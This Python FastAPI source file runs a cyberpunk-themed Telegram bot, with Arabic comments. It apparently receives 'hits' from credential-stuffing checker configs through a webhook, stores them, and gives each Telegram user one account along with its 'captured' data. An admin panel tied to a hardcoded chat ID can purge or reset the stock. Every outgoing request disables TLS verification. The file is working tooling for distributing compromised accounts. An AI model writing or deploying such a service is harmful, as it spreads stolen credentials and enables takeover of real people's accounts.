from fastapi import FastAPI, Request
import httpx
import os
from sqlalchemy import create_engine, Column, Integer, String, Boolean
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

app = FastAPI()

# ==================== CYBERPUNK CONFIG ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = ["6624995237"] # ضع الـ Chat ID الخاص بك هنا

DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE CONFIG ====================
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)

class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)

Base.metadata.create_all(bind=engine)

# ==================== CYBER KEYBOARDS ====================

def get_main_keyboard(is_admin: bool):
    # أزرار القائمة الرئيسية بثيم النيون والسيبراني
    buttons = [
        [{"text": "⚡ 🧬 DISPENSE ACCOUNT 🧬 ⚡"}, {"text": "📡 🌐 CORE MATRIX STATS 🌐 📡"}]
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 CYBERNETIC CONTROL PANEL 👾 🛠️"}])
        
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def get_inline_control_buttons():
    # أزرار لوحة التحكم الشفافة المتوهجة
    return {
        "inline_keyboard": [
            [
                {"text": "🧬 REBOOT DATABASE", "callback_data": "reset_delivered"},
                {"text": "🚨 PURGE ALL DATA", "callback_data": "clear_accounts"}
            ],
            [
                {"text": "🔄 REFRESH MAINFRAME", "callback_data": "refresh_admin_stats"}
            ]
        ]
    }

# ==================== ENDPOINTS ====================

@app.get("/")
def read_root():
    return {"status": "Cyber Core Matrix is Online & Fully Operational."}

@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()
        config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "UNKNOWN_MODULE"
        account_data = data.get("data", "NO_DATA")
        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "NO_CAPTURED_DATA"
        
        exists = db.query(Account).filter(Account.account_data == account_data).first()
        if exists:
            return {"status": "ignored"}
            
        new_account = Account(
            config_name=config_name,
            account_data=account_data,
            captured_data=captured_data,
            is_given=False
        )
        db.add(new_account)
        db.commit()
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}
    finally:
        db.close()

@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
        
        # --- [أ] Callback Queries (الأزرار الشفافة لـ لوحة الأدمن) ---
        if "callback_query" in payload:
            callback_id = payload["callback_query"]["id"]
            chat_id = str(payload["callback_query"]["message"]["chat"]["id"])
            message_id = payload["callback_query"]["message"]["message_id"]
            data = payload["callback_query"]["data"]
            
            if chat_id not in ADMIN_IDS:
                async with httpx.AsyncClient(verify=False) as client:
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "❌ ACCESS DENIED: SYSTEM BREACH DETECTED.", "show_alert": True})
                return {"status": "success"}

            async with httpx.AsyncClient(verify=False) as client:
                if data == "reset_delivered":
                    db.query(DeliveredAccount).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🧹 DATABASE FLUSHED: ALL USERS RESTORED TO ACCESS LIST.", "show_alert": True})
                
                elif data == "clear_accounts":
                    db.query(Account).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🚨 MAINFRAME PURGED: ALL ACCOUNTS DELETED FROM SECTOR 0.", "show_alert": True})
                
                elif data == "refresh_admin_stats":
                    total_accounts = db.query(Account).count()
                    available_count = db.query(Account).filter(Account.is_given == False).count()
                    delivered_count = db.query(Account).filter(Account.is_given == True).count()
                    
                    updated_text = (
                        f"┌─── 🌌 **「 CYBER CORE PANEL 」** 🌌\n"
                        f"│\n"
                        f"├── 🟣 **TOTAL ENCRYPTED:** `{total_accounts}`\n"
                        f"├── 🟢 **READY FOR INJECTION:** `{available_count}`\n"
                        f"└── 🔴 **DECOY DISTRIBUTED:** `{delivered_count}`\n"
                        f"│\n"
                        f"└────────────── [ LIVE MATRIX ] 🖥️"
                    )
                    await client.post(f"{telegram_url}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": updated_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})
            return {"status": "success"}

        # --- [ب] التعامل مع الرسائل والأزرار الثابتة ---
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}
            
        chat_id = str(payload["message"]["chat"]["id"])
        user_text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS
        
        # أمر البداية السيبراني ترحيبي
        if user_text == "/start":
            welcome_text = (
                f"🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
                f"⚡ `STATUS: CONNECTED`\n"
                f"🎛️ `INTERFACE: NEON NIGHT v3.0`\n\n"
                f"🤖 _استخدم لوحة التحكم اللاسلكية بالأسفل لاختراق مصفوفة البيانات وسحب الحسابات المتاحة فوراً..._"
            )
            payload_data = {
                "chat_id": chat_id,
                "text": welcome_text,
                "reply_markup": get_main_keyboard(is_admin),
                "parse_mode": "Markdown"
            }
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(f"{telegram_url}/sendMessage", json=payload_data)
                
        # زر فحص المتوفر السيبراني
        elif user_text == "📡 🌐 CORE MATRIX STATS 🌐 📡" or user_text == "/stats":
            available_count = db.query(Account).filter(Account.is_given == False).count()
            reply_text = (
                f"┌─── 📡 **「 MATRIX STORAGE 」** 📡\n"
                f"│\n"
                f"└── 🟢 **AVAILABLE IN STORAGE:** `{available_count}` ACCOUNTS\n"
                f"│\n"
                f"└───────────── [ ONLINE ] ⚡"
            )
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                
        # زر سحب حساب جديد بتنسيق نيون مشفر وثيم هكر فاخر
        elif user_text == "⚡ 🧬 DISPENSE ACCOUNT 🧬 ⚡" or user_text == "/get":
            already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
            
            if already_received:
                reply_text = "🚨 **SYSTEM DENIAL:** `FIREWALL ACTIVE` 🚨\n\n❌ لقد قمت بحقن هذا الـ ID مسبقاً! النظام يسمح بـ **حصّة واحدة فقط (1 account per terminal)** لحماية الشبكة من الضغط."
            else:
                available_account = db.query(Account).filter(Account.is_given == False).first()
                
                if not available_account:
                    reply_text = "🚨 **MAINFRAME ERROR:** `STORAGE EMPTY` 🚨\n\n😔 نأسف، لا توجد أي بيانات مشفرة في مخزن المصفوفة حالياً. انتظر ضخ الـ Webhook القادم..."
                else:
                    available_account.is_given = True
                    user_claim = DeliveredAccount(user_id=chat_id)
                    db.add(user_claim)
                    db.commit()
                    
                    reply_text = (
                        f"🌌 **⚡ 「 DATA INJECTION SUCCESSFUL 」 ⚡** 🌌\n\n"
                        f"📦 **MODULE (Config):**\n`{available_account.config_name}`\n\n"
                        f"👤 **TARGET DATA (Account):**\n`{available_account.account_data}`\n\n"
                        f"⚙️ **DECRYPTED LOGS (Captured):**\n`{available_account.captured_data}`\n\n"
                        f"🔒 _STATUS: TERMINAL LOCKED - SECURE YOUR CREDENTIALS._"
                    )
                    
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                
        # لوحة تحكم المسؤول السيبرانية
        elif user_text == "🛠️ 👾 CYBERNETIC CONTROL PANEL 👾 🛠️" and is_admin:
            total_accounts = db.query(Account).count()
            available_count = db.query(Account).filter(Account.is_given == False).count()
            delivered_count = db.query(Account).filter(Account.is_given == True).count()
            
            admin_text = (
                f"┌─── 🌌 **「 CYBER CORE PANEL 」** 🌌\n"
                f"│\n"
                f"├── 🟣 **TOTAL ENCRYPTED:** `{total_accounts}`\n"
                f"├── 🟢 **READY FOR INJECTION:** `{available_count}`\n"
                f"└── 🔴 **DECOY DISTRIBUTED:** `{delivered_count}`\n"
                f"│\n"
                f"└────────────── [ TERMINAL COMMANDS ] 👇"
            )
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": admin_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})

        return {"status": "success"}
    except Exception as e:
        db.rollback()
        print(f"Telegram Webhook Error: {str(e)}")
        return {"status": "error"}
    finally:
        db.close()
